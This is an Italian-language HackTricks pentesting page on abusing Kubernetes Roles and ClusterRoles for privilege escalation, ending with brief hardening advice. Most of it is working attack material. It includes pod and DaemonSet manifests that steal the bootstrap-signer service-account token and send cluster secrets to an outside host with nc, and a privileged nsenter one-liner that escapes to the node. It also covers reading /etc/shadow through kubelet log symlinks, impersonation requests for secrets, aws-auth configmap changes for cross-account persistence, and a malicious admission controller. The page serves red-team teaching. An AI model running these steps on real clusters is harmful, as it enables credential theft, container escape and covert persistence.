# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

Qui puoi trovare alcune configurazioni di Ruoli e ClusterRoles potenzialmente pericolose.\
Ricorda che puoi ottenere tutte le risorse supportate con `kubectl api-resources`

## **Elevazione dei privilegi**

Con il termine "elevazione dei privilegi" si intende ottenere **accesso a un diverso principale** all'interno del cluster **con privilegi diversi** (all'interno del cluster Kubernetes o a cloud esterni) rispetto a quelli gi√† disponibili. In Kubernetes ci sono fondamentalmente **4 tecniche principali per l'elevazione dei privilegi**:

* Essere in grado di **impersonare** altri utenti/gruppi/SA con privilegi migliori all'interno del cluster Kubernetes o a cloud esterni
* Essere in grado di **creare/patch/eseguire pod** in cui √® possibile **trovare o collegare SA** con privilegi migliori all'interno del cluster Kubernetes o a cloud esterni
* Essere in grado di **leggere segreti** poich√© i token SA sono memorizzati come segreti
* Essere in grado di **scappare al nodo** da un container, dove √® possibile rubare tutti i segreti dei container in esecuzione nel nodo, le credenziali del nodo e le autorizzazioni del nodo all'interno del cloud in cui √® in esecuzione (se presente)
* Una quinta tecnica che merita una menzione √® la capacit√† di **eseguire il port-forward** in un pod, poich√© potresti essere in grado di accedere a risorse interessanti all'interno di quel pod.

### Accesso a Qualsiasi Risorsa o Verbo (Wildcard)

Il **carattere jolly (\*) concede il permesso su qualsiasi risorsa con qualsiasi verbo**. Viene utilizzato dagli amministratori. All'interno di un ClusterRole, ci√≤ significa che un attaccante potrebbe abusare di qualsiasi namespace nel cluster.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```

### Accesso a qualsiasi risorsa con un verbo specifico

Nel RBAC, alcune autorizzazioni comportano rischi significativi:

1. **`create`:** Concede la possibilit√† di creare qualsiasi risorsa del cluster, rischiando l'elevazione dei privilegi.
2. **`list`:** Consente di elencare tutte le risorse, potenzialmente rivelando dati sensibili.
3. **`get`:** Permette l'accesso ai segreti degli account di servizio, rappresentando una minaccia per la sicurezza.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```

### Creazione Pod - Rubare Token

Un attaccante con i permessi per creare un pod potrebbe allegare un Service Account privilegiato al pod e rubare il token per impersonare il Service Account. In questo modo, l'attaccante potrebbe ottenere privilegi elevati.

Esempio di un pod che ruber√† il token del Service Account `bootstrap-signer` e lo invier√† all'attaccante:

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```

### Creazione e Fuga del Pod

Di seguito sono elencati tutti i privilegi a cui un container pu√≤ accedere:

* **Accesso privilegiato** (disabilitazione delle protezioni e impostazione delle capacit√†)
* **Disabilitazione dei namespace hostIPC e hostPid** che possono aiutare ad aumentare i privilegi
* **Disabilitazione del namespace hostNetwork**, che consente di accedere ai privilegi del cloud dei nodi e di ottenere un migliore accesso alle reti
* **Montaggio di / dell'host all'interno del container**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Crea il pod con:

```bash
kubectl --token $token create -f mount_root.yaml
```

Una riga presa da [questo tweet](https://twitter.com/mauilion/status/1129468485480751104) con alcune aggiunte:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Ora che puoi sfuggire al nodo, controlla le tecniche di post-exploitation in:

#### Stealth

Probabilmente vuoi essere **pi√π stealth**, nelle seguenti pagine puoi vedere a cosa avresti accesso se crei un pod abilitando solo alcuni dei privilegi menzionati nel modello precedente:

* **Privileged + hostPID**
* **Solo privilegiati**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Puoi trovare esempi su come creare/abusare delle configurazioni dei pod privilegiati precedenti su_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Creazione del Pod - Passaggio al cloud

Se puoi **creare** un **pod** (e facoltativamente un **service account**), potresti essere in grado di **ottenere privilegi nell'ambiente cloud** assegnando ruoli cloud a un pod o a un service account e quindi accedendo ad esso.\
Inoltre, se puoi creare un **pod con lo spazio dei nomi della rete dell'host**, puoi **rubare il ruolo IAM** dell'istanza del **nodo**.

Per ulteriori informazioni, consulta:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Creazione/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs e Cronjobs**

√à possibile abusare di queste autorizzazioni per **creare un nuovo pod** e ottenere privilegi come nell'esempio precedente.

Il seguente yaml **crea un daemonset ed esfila il token del SA** all'interno del pod:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```

### **Esecuzione di comandi nei Pods**

**`pods/exec`** √® una risorsa in Kubernetes utilizzata per **eseguire comandi in una shell all'interno di un pod**. Ci√≤ consente di **eseguire comandi all'interno dei contenitori o ottenere una shell interna**.

Pertanto, √® possibile **accedere a un pod e rubare il token dell'account di servizio (SA)**, oppure accedere a un pod privilegiato, sfuggire al nodo e rubare tutti i token dei pod presenti nel nodo e (ab)usare il nodo:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

### port-forward

Questa autorizzazione consente di **inoltrare una porta locale a una porta specifica nel pod indicato**. Questo √® pensato per consentire il debug delle applicazioni in esecuzione all'interno di un pod in modo semplice, ma un attaccante potrebbe abusarne per ottenere accesso ad applicazioni interessanti (come DB) o vulnerabili (webs?) all'interno di un pod:

```
kubectl port-forward pod/mypod 5000:5000
```

### Fuga da /var/log/ scrivibile dagli host

Come [**indicato in questa ricerca**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), se puoi accedere o creare un pod con il **montaggio della directory `/var/log/` degli host**, puoi **fuggire dal container**.\
Questo √® fondamentalmente perch√© quando il **Kube-API cerca di ottenere i log** di un container (usando `kubectl logs <pod>`), richiede il file `0.log` del pod utilizzando l'endpoint `/logs/` del servizio **Kubelet**.\
Il servizio Kubelet espone l'endpoint `/logs/` che essenzialmente **espone il filesystem `/var/log` del container**.

Pertanto, un attaccante con **accesso in scrittura alla cartella /var/log/** del container potrebbe sfruttare questi comportamenti in 2 modi:

* Modificando il file `0.log` del proprio container (di solito situato in `/var/logs/pods/namespace_pod_uid/container/0.log`) in modo che sia un **symlink che punta a `/etc/shadow`**, ad esempio. Quindi, sarai in grado di esfiltrare il file shadow degli host eseguendo:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* Se l'attaccante controlla un qualsiasi principale con i **permessi di lettura di `nodes/log`**, pu√≤ semplicemente creare un **symlink** in `/host-mounted/var/log/sym` a `/` e quando **accede a `https://<gateway>:10250/logs/sym/` elencher√† il filesystem root degli host** (modificando il symlink si pu√≤ ottenere accesso ai file).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Un laboratorio e uno sfruttamento automatizzato possono essere trovati in** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Bypassare la protezione readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Se hai la fortuna e la capacit√† altamente privilegiata `CAP_SYS_ADMIN` √® disponibile, puoi semplicemente rimontare la cartella come rw:

```bash
mount -o rw,remount /hostlogs/
```

#### Bypassare la protezione di hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Come indicato in [**questa ricerca**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), √® possibile bypassare la protezione:

```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```

Ci√≤ era stato pensato per prevenire fughe come quelle precedenti, invece di utilizzare un mount hostPath, utilizzare un PersistentVolume e un PersistentVolumeClaim per montare una cartella dell'host nel container con accesso in scrittura:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```

### **Impersonare account privilegiati**

Con il privilegio di [**impersonare un utente**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), un attaccante potrebbe impersonare un account privilegiato.

Basta utilizzare il parametro `--as=<username>` nel comando `kubectl` per impersonare un utente, o `--as-group=<group>` per impersonare un gruppo:

```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```

O utilizza l'API REST:

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Elenco dei segreti

Il permesso di **elencare i segreti potrebbe consentire a un attaccante di leggere effettivamente i segreti** accedendo al punto di accesso dell'API REST:

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Lettura di un segreto - forzatura degli ID dei token

Mentre un attaccante in possesso di un token con permessi di lettura richiede il nome esatto del segreto per utilizzarlo, a differenza del privilegio pi√π ampio di _**elencare i segreti**_, ci sono comunque vulnerabilit√†. Gli account di servizio predefiniti nel sistema possono essere enumerati, ognuno associato a un segreto. Questi segreti hanno una struttura di nome: un prefisso statico seguito da un token alfanumerico casuale di cinque caratteri (escludendo determinati caratteri) secondo il [codice sorgente](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Il token viene generato da un insieme limitato di 27 caratteri (`bcdfghjklmnpqrstvwxz2456789`), anzich√© dall'intero intervallo alfanumerico. Questa limitazione riduce il totale delle possibili combinazioni a 14.348.907 (27^5). Di conseguenza, un attaccante potrebbe eseguire un attacco di forza bruta per dedurre il token in poche ore, potenzialmente portando a un'escalation dei privilegi accedendo a account di servizio sensibili.

### Richieste di firma del certificato

Se hai i verbi **`create`** nella risorsa `certificatesigningrequests` (o almeno in `certificatesigningrequests/nodeClient`). Puoi **creare** una nuova CeSR di un **nuovo nodo**.

Secondo la [documentazione √® possibile approvare automaticamente queste richieste](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), quindi in quel caso **non hai bisogno di permessi aggiuntivi**. In caso contrario, dovresti essere in grado di approvare la richiesta, il che significa aggiornare in `certificatesigningrequests/approval` e `approve` in `signers` con il nome della risorsa `<signerNameDomain>/<signerNamePath>` o `<signerNameDomain>/*`

Un **esempio di ruolo** con tutti i permessi richiesti √®:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```

Quindi, con il nuovo CSR del nodo approvato, √® possibile **abusare** dei permessi speciali dei nodi per **rubare segreti** e **escalare i privilegi**.

In [**questo post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) e [**questo altro**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), la configurazione GKE K8s TLS Bootstrap √® configurata con **firma automatica** ed √® abusata per generare le credenziali di un nuovo nodo K8s e quindi abusare di esse per escalare i privilegi rubando segreti.\
Se **hai i privilegi menzionati, puoi fare la stessa cosa**. Nota che il primo esempio elude l'errore che impedisce a un nuovo nodo di accedere ai segreti all'interno dei contenitori perch√© un **nodo pu√≤ accedere solo ai segreti dei contenitori montati su di esso**.

Il modo per eludere ci√≤ √® semplicemente **creare delle credenziali per il nodo con il nome in cui √® montato il contenitore con i segreti interessanti** (ma controlla come farlo nel primo post):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

I principali che possono modificare i **`configmaps`** nel namespace kube-system su cluster EKS (devono essere in AWS) possono ottenere i privilegi di amministratore del cluster sovrascrivendo il configmap **aws-auth**.\
I verbi necessari sono **`update`** e **`patch`**, o **`create`** se il configmap non √® stato creato:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Puoi utilizzare **`aws-auth`** per **persistenza** dando accesso agli utenti da **altri account**.

Tuttavia, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **non funziona da un account diverso**. Ma in realt√† `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funziona se inserisci l'ARN del cluster invece del solo nome.\
Per far funzionare `kubectl`, assicurati di **configurare** il **kubeconfig della vittima** e aggiungi `--profile other_account_role` agli argomenti di aws exec in modo che kubectl utilizzi il profilo dell'account degli altri per ottenere il token e contattare AWS.
{% endhint %}

### Escalare in GKE

Ci sono **2 modi per assegnare le autorizzazioni K8s ai principali GCP**. In ogni caso, il principale ha anche bisogno dell'autorizzazione **`container.clusters.get`** per poter raccogliere le credenziali per accedere al cluster, altrimenti dovrai **generare il tuo file di configurazione kubectl** (segui il link successivo).

{% hint style="warning" %}
Quando si parla con il punto di accesso dell'API K8s, verr√† inviato il **token di autenticazione GCP**. Quindi, GCP, tramite il punto di accesso dell'API K8s, verificher√† prima se il principale (tramite email) ha accesso al cluster, quindi verificher√† se ha accesso tramite GCP IAM.\
Se **uno qualsiasi** di questi √® **vero**, verr√† **risposto**. Se **non √® vero**, verr√† restituito un **errore** suggerendo di concedere **autorizzazioni tramite GCP IAM**.
{% endhint %}

Il primo metodo consiste nell'utilizzare **GCP IAM**, le autorizzazioni K8s hanno le loro **autorizzazioni equivalenti GCP IAM**, e se il principale le ha, sar√† in grado di utilizzarle.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Il secondo metodo consiste nell'**assegnare le autorizzazioni K8s all'interno del cluster** identificando l'utente tramite la sua **email** (inclusi gli account di servizio GCP).

### Creare token di serviceaccounts

I principali che possono **creare TokenRequests** (`serviceaccounts/token`) Quando si parla con il punto di accesso dell'API K8s, gli SA (informazioni da [**qui**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

I principali che possono **`aggiornare`** o **`patch`** **`pods/ephemeralcontainers`** possono ottenere **esecuzione di codice su altri pods**, e potenzialmente **uscire** dal loro nodo aggiungendo un contenitore effimero con un securityContext privilegiato.

### ValidatingWebhookConfigurations o MutatingWebhookConfigurations

I principali con uno qualsiasi dei verbi `create`, `update` o `patch` su `validatingwebhookconfigurations` o `mutatingwebhookconfigurations` potrebbero essere in grado di **creare una di tali webhookconfigurations** per poter **escalare i privilegi**.

Per un esempio di [`mutatingwebhookconfigurations, controlla questa sezione di questo post`](./#malicious-admission-controller).

### Escalare

Come puoi leggere nella sezione successiva: [**Prevenzione integrata dell'escalation dei privilegi**](./#built-in-privileged-escalation-prevention), un principale non pu√≤ aggiornare n√© creare ruoli o clusterroles senza avere le nuove autorizzazioni. A meno che non abbia il **verbo `escalate`** su **`roles`** o **`clusterroles`.**\
Quindi pu√≤ aggiornare/creare nuovi ruoli, clusterroles con autorizzazioni migliori rispetto a quelle che ha.

### Nodes proxy

I principali con accesso alla sotto risorsa **`nodes/proxy`** possono **eseguire codice su pods** tramite l'API Kubelet (secondo [**questo**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Ulteriori informazioni sull'autenticazione di Kubelet in questa pagina:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Hai un esempio di come ottenere [**RCE parlando autorizzato a un'API Kubelet qui**](../pentesting-kubernetes-services/#kubelet-rce).

### Eliminare pods + nodi non schedulabili

I principali che possono **eliminare pods** (verbo `delete` sulla risorsa `pods`), o **espellere pods** (verbo `create` sulla risorsa `pods/eviction`), o **cambiare lo stato del pod** (accesso a `pods/status`) e possono **rendere altri nodi non schedulabili** (accesso a `nodes/status`) o **eliminare nodi** (verbo `delete` sulla risorsa `nodes`) e hanno il controllo su un pod, potrebbero **rubare i pods dagli altri nodi** in modo che vengano **eseguiti** nel nodo **compromesso** e l'attaccante pu√≤ **rubare i token** da quei pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Stato dei servizi (CVE-2020-8554)

I principali che possono **modificare** **`services/status`** possono impostare il campo `status.loadBalancer.ingress.ip` per sfruttare la **vulnerabilit√† non corretta CVE-2020-8554** e lanciare attacchi **MiTM contro il cluster**. La maggior parte delle mitigazioni per CVE-2020-8554 impediscono solo ai servizi ExternalIP (secondo [**questo**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Stato dei nodi e dei pod

I principali con le autorizzazioni **`update`** o **`patch`** su `nodes/status` o `pods/status` possono modificare le etichette per influenzare i vincoli di pianificazione imposti.

## Prevenzione integrata dell'escalation dei privilegi

Kubernetes ha un [meccanismo integrato](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) per prevenire l'escalation dei privilegi.

Questo sistema garantisce che **gli utenti non possano elevare i propri privilegi modificando ruoli o associazioni di ruoli**. L'applicazione di questa regola avviene a livello di API, fornendo una protezione anche quando l'autorizzatore RBAC √® inattivo.

La regola stabilisce che un **utente pu√≤ creare o aggiornare un ruolo solo se possiede tutte le autorizzazioni che il ruolo comprende**. Inoltre, la portata delle autorizzazioni esistenti dell'utente deve essere allineata con quella del ruolo che sta cercando di creare o modificare: o a livello di cluster per ClusterRoles o limitata allo stesso namespace (o a livello di cluster) per Roles.

{% hint style="warning" %}
C'√® un'eccezione alla regola precedente. Se un principale ha il **verbo `escalate`** su **`roles`** o **`clusterroles`** pu√≤ aumentare i privilegi di ruoli e clusterroles anche senza avere le autorizzazioni stesse.
{% endhint %}

### **Ottieni e modifica RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
Apparentemente questa tecnica funzionava in passato, ma secondo i miei test non funziona pi√π per lo stesso motivo spiegato nella sezione precedente. Non puoi creare/modificare un rolebinding per darti o dare a un diverso SA alcuni privilegi se non li hai gi√†.
{% endhint %}

Il privilegio di creare Rolebindings consente a un utente di **associare ruoli a un service account**. Questo privilegio pu√≤ potenzialmente portare all'escalation dei privilegi perch√© **consente all'utente di associare privilegi di amministratore a un service account compromesso.**

## Altri attacchi

### Applicazione proxy sidecar

Per impostazione predefinita, non vi √® alcuna crittografia nella comunicazione tra i pod. Autenticazione reciproca, bidirezionale, da pod a pod.

#### Crea un'applicazione proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Crea il tuo file .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Modifica il tuo file .yaml e aggiungi le linee commentate:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```

Vedi i log del proxy:

```bash
kubectl logs app -C proxy
```

Ulteriori informazioni su: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Malicious Admission Controller

Un admission controller **intercetta le richieste al server API di Kubernetes** prima della persistenza dell'oggetto, ma **dopo che la richiesta √® stata autenticata** **e autorizzata**.

Se un attaccante riesce in qualche modo a **iniettare un Mutationg Admission Controller**, sar√† in grado di **modificare le richieste gi√† autenticate**. Ci√≤ gli permette potenzialmente di ottenere privilegi elevati e, pi√π comunemente, di persistere nel cluster.

**Esempio da** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Controlla lo stato per vedere se √® pronto:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Successivamente, eseguire il deploy di un nuovo pod:

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Quando si verifica l'errore `ErrImagePull`, controlla il nome dell'immagine con una delle seguenti query:

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Come puoi vedere nell'immagine sopra, abbiamo provato ad eseguire l'immagine `nginx` ma l'immagine eseguita √® `rewanthtammana/malicious-image`. Cosa √® successo!!?

#### Specifiche tecniche <a href="#heading-technicalities" id="heading-technicalities"></a>

Lo script `./deploy.sh` stabilisce un admission controller di webhook di mutazione, che modifica le richieste all'API di Kubernetes come specificato nelle sue linee di configurazione, influenzando i risultati osservati:

```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```

Il frammento sopra sostituisce la prima immagine del container in ogni pod con `rewanthtammana/malicious-image`.

## Best Practices

### **Disabilitare l'automount dei token dell'account di servizio**

* **Pod e Account di servizio**: Di default, i pod montano un token dell'account di servizio. Per migliorare la sicurezza, Kubernetes consente di disabilitare questa funzionalit√† di automount.
* **Come applicare**: Impostare `automountServiceAccountToken: false` nella configurazione degli account di servizio o dei pod a partire dalla versione 1.6 di Kubernetes.

### **Assegnazione utente restrittiva in RoleBindings/ClusterRoleBindings**

* **Inclusione selettiva**: Assicurarsi che solo gli utenti necessari siano inclusi in RoleBindings o ClusterRoleBindings. Effettuare regolarmente audit e rimuovere gli utenti non pertinenti per mantenere una sicurezza rigorosa.

### **Ruoli specifici del namespace rispetto a ruoli a livello di cluster**

* **Ruoli vs ClusterRoles**: Preferire l'uso di Ruoli e RoleBindings per le autorizzazioni specifiche del namespace anzich√© ClusterRoles e ClusterRoleBindings, che si applicano a livello di cluster. Questo approccio offre un controllo pi√π preciso e limita la portata delle autorizzazioni.

### **Utilizzare strumenti automatizzati**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Riferimenti**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

